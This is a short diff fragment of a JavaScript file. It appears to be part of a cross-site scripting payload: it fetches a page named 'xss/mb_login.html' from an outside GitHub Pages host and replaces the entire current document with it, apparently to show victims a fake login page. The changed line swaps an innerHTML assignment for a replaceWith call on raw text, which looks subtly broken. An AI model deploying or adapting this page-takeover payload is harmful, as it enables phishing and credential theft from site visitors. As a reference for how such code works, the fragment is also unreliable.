@@ -46,7 +46,7 @@ const main = () => {
     xhr.open("get", "https://existencing.github.io/xss/mb_login.html", true);
     xhr.onreadystatechange = function () {
       if (xhr.readyState == 4 && xhr.status == 200) {
-        document.documentElement.innerHTML = xhr.responseText;
+        document.documentElement.replaceWith(xhr.responseText)
       }
     };
     xhr.send();
